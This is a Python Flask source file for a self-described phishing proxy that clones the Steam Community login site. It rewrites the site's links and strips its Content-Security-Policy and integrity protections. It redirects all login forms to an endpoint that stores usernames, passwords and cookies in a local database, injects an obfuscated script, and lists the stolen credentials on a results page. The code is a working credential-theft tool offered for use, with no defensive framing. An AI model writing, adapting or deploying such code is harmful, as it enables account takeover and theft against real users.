import requests
from flask import Flask, request, Response, redirect, render_template, url_for
from bs4 import BeautifulSoup
import os
import datetime
from urllib.parse import urlparse, urlunparse, parse_qsl, urljoin
import sqlite3
import json
import rsa
import base64
import time
import random
# --- NEW: IMPORT UNDETECTED CHROME DRIVER ---
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

app = Flask(__name__)

# --- CONFIGURATION ---
# The real website we are cloning.
TARGET_HOST = "steamcommunity.com"
# The protocol to use (http:// or https://)
TARGET_PROTOCOL = "https://"
# --- NEW: PROXY FOR OUTGOING REQUESTS (OPTIONAL) ---
# If you are being rate-limited by the target, you can use a proxy.
# Example for an HTTP proxy: "http://user:pass@10.10.1.10:3128"
# Example for a SOCKS5 proxy: "socks5h://user:pass@host:port" (use socks5h for DNS resolution)
OUTGOING_PROXY = None # Set to use Tor Browser proxy by default. Set to None to disable.
# --- END NEW ---
# --- NEW: DATABASE CONFIGURATION ---
DB_FILE = "phishing_data.db"
KNOWN_HOSTS = ('steampowered.com', 'steamcommunity.com', 'steamstatic.com', 'akamaihd.net')


def init_database():
    """Creates the database and the credentials table if they don't exist."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            username TEXT,
            password TEXT,
            cookies TEXT
        )
    ''')
    conn.commit()
    conn.close()


def rewrite_links(content, response_headers, final_url):
    """
    This is the definitive and robust link-rewriting engine. It correctly
    handles all forms of URLs, including relative, absolute, and protocol-relative,
    to ensure all assets are proxied correctly.
    """
    print("\n[+] Starting link rewriting process...")
    content_type = response_headers.get('Content-Type', '')
    encoding = 'utf-8'
    if 'charset=' in content_type:
        encoding = content_type.split('charset=')[-1]
    
    soup = BeautifulSoup(content, 'html.parser', from_encoding=encoding)
    base_url = final_url
    print(f"[*] Base URL for rewriting is: {base_url}")

    # --- NEW: Remove security policies that block our proxy ---
    # Remove Content Security Policy meta tags
    for tag in soup.find_all('meta', attrs={'http-equiv': 'Content-Security-Policy'}):
        print("[+] Found and removed CSP meta tag.")
        tag.decompose()

    # Remove Subresource Integrity attributes from links and scripts
    for tag in soup.find_all(['link', 'script'], integrity=True):
        print(f"[+] Found and removed integrity attribute from <{tag.name}> tag.")
        del tag['integrity']
    # --- END NEW ---

    def rewrite_url(url_string):
        """A robust helper to rewrite a single URL."""
        if not url_string:
            return ""
        
        print(f"  - Analyzing URL: {url_string[:100]}{'...' if len(url_string) > 100 else ''}")

        if url_string.startswith(('data:', '#', 'mailto:', 'javascript:')):
            print("    -> Ignored (scheme)")
            return url_string

        absolute_url = urljoin(base_url, url_string)
        parsed_url = urlparse(absolute_url)
        
        is_known_host = any(parsed_url.netloc.endswith(host) for host in KNOWN_HOSTS)
        
        if is_known_host:
            scheme = parsed_url.scheme if parsed_url.scheme else 'https'
            query = '?' + parsed_url.query if parsed_url.query else ''
            rewritten_url = f"/proxy/{scheme}/{parsed_url.netloc}{parsed_url.path}{query}"
            print(f"    -> Rewritten to: {rewritten_url}")
            return rewritten_url
        else:
            print(f"    -> Ignored (not a known host: {parsed_url.netloc})")
            return absolute_url

    for attribute in ['href', 'src']:
        print(f"\n[*] Scanning for '{attribute}' attributes...")
        for tag in soup.find_all(attrs={attribute: True}):
            tag[attribute] = rewrite_url(tag[attribute])

    print("\n[*] Scanning for 'srcset' attributes...")
    for tag in soup.find_all(srcset=True):
        srcset_parts = tag['srcset'].split(',')
        rewritten_parts = []
        print(f"  - Analyzing srcset: {tag['srcset'][:100]}...")
        for part in srcset_parts:
            part = part.strip()
            url_and_descriptor = part.split()
            if url_and_descriptor:
                url = url_and_descriptor[0]
                descriptor = " ".join(url_and_descriptor[1:])
                rewritten_url = rewrite_url(url)
                rewritten_parts.append(f"{rewritten_url} {descriptor}" if descriptor else rewritten_url)
        tag['srcset'] = ", ".join(rewritten_parts)

    for form in soup.find_all('form'):
        form['action'] = "/submit_credentials"
        
    body = soup.find('body')
    if body:
        try:
            with open('obfuscated.js', 'r', encoding='utf-8') as f:
                obfuscated_content = f.read()
            
            script_tag = soup.new_tag('script')
            script_tag.string = obfuscated_content
            body.append(script_tag)
        except FileNotFoundError:
            print("[!] WARNING: obfuscated.js not found. No script will be injected.")
        except Exception as e:
            print(f"[!] Error injecting script from file: {e}")
    
    print("[+] Link rewriting process finished.")
    return str(soup)


@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    username = None
    password = None
    
    raw_data = request.get_data(as_text=True)
    if raw_data:
        try:
            parsed_data = dict(parse_qsl(raw_data))
            username = parsed_data.get('username')
            password = parsed_data.get('password')
        except:
            pass
            
    if not username or not password:
        return Response(json.dumps({'success': False, 'error': 'Missing credentials'}), status=400, mimetype='application/json')

    # --- Step 1: Save captured credentials immediately ---
    credential_id = None
    try:
        cookies_str = json.dumps(request.cookies.to_dict())
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO credentials (username, password, cookies) VALUES (?, ?, ?)",
            (username, password, cookies_str)
        )
        credential_id = cursor.lastrowid
        conn.commit()
        conn.close()
        print(f"[+] Credentials for user '{username}' captured. ID: {credential_id}")
    except Exception as e:
        print(f"[!] Database Error: {e}")
        # We can still proceed even if DB fails
        
    # --- Step 2: Signal completion to the frontend ---
    # The javascript will see a success and redirect the user to the real Steam site.
    print("[+] Credentials captured. Redirecting user to the real Steam login page.")
    return Response(json.dumps({'success': True, 'login_complete': True}), status=200, mimetype='application/json')


# --- ADMIN PANEL TO VIEW RESULTS (UPDATED) ---
@app.route('/results')
def view_results():
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT id, timestamp, username, password, cookies FROM credentials ORDER BY timestamp DESC")
        entries = cursor.fetchall()
        conn.close()
        return render_template('admin.html', entries=entries)
    except Exception as e:
        return f"<h1>Error</h1><p>Could not retrieve results from database: {e}</p>", 500


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def master_proxy(path):
    """
    This is the new single master proxy. It handles both the initial request
    and all subsequent asset requests, routing them to the correct origin server.
    """
    # --- NEW: Redirect common entry points to the full login page ---
    if path in ('', 'login', 'login/'):
        return redirect('/login/home/?goto=')
    # --- END NEW ---

    proxies = {'http': OUTGOING_PROXY, 'https': OUTGOING_PROXY} if OUTGOING_PROXY else None
    if path.startswith('proxy/'):
        # This is an asset request for a specific, encoded host.
        # Path format: proxy/<protocol>/<host>/<real_path>
        try:
            _, protocol, host, real_path = path.split('/', 3)
            # Reconstruct the original URL for the asset
            original_url = f"{protocol}://{host}/{real_path}"
            if request.query_string:
                original_url += "?" + request.query_string.decode('utf-8')
            
            print(f"[*] Proxying asset from: {original_url}")
            
            # Forward the request to the original asset host
            headers = {key: value for (key, value) in request.headers if key.lower() != 'host'}
            headers['Host'] = host
            
            resp = requests.request(
                method=request.method, url=original_url, headers=headers,
                data=request.get_data(), cookies=request.cookies,
                allow_redirects=True, stream=True, proxies=proxies
            )
            
            # --- MODIFIED: Remove security headers ---
            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'content-security-policy']
            response_headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
            
            # Return the asset directly without modification
            return Response(resp.iter_content(chunk_size=1024), resp.status_code, response_headers)

        except Exception as e:
            print(f"[!] Asset Proxy Error: {e}")
            return "<h1>Proxy Error</h1><p>Could not fetch asset.</p>", 502

    else:
        # This is the initial request for an HTML page.
        target_url = f"{TARGET_PROTOCOL}{TARGET_HOST}/{path}"
        if request.query_string:
            target_url += "?" + request.query_string.decode('utf-8')
        
        print(f"[*] Proxying initial page: {target_url}")
    
        headers = {key: value for (key, value) in request.headers if key.lower() != 'host'}
        headers['Host'] = TARGET_HOST
    
        try:
            resp = requests.request(
                    method=request.method, url=target_url, headers=headers,
                    data=request.get_data(), cookies=request.cookies,
                    allow_redirects=True, stream=True, proxies=proxies
                )
                
            final_url = resp.url
            # --- MODIFIED: Remove security headers ---
            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'content-security-policy']
            response_headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
        
            content_type = resp.headers.get('Content-Type', '')
        
            if 'text/html' in content_type:
                # Rewrite links in the HTML and return
                content = rewrite_links(resp.content, resp.headers, final_url)
                return Response(content, resp.status_code, response_headers)
            else:
                # For non-HTML content (e.g., images on the first request), stream it
                return Response(resp.iter_content(chunk_size=1024), resp.status_code, response_headers)

        except requests.exceptions.RequestException as e:
            print(f"[!] Initial Proxy Error: {e}")
            return "<h1>Proxy Error</h1><p>Could not connect to the target server.</p>", 502


if __name__ == '__main__':
    init_database() # Initialize the database on startup
    print("Starting Standalone Phishing Proxy Server...")
    print(f"Targeting: {TARGET_PROTOCOL}{TARGET_HOST}")
    print(f"Credentials will be saved to: {DB_FILE}")
    print(f"View captured data at: http://127.0.0.1:5000/results")
    # --- NEW: Updated URL to reflect new target ---
    print(f"--> Open this URL in your browser: http://127.0.0.1:5000/")
    app.run(port=5000, debug=False)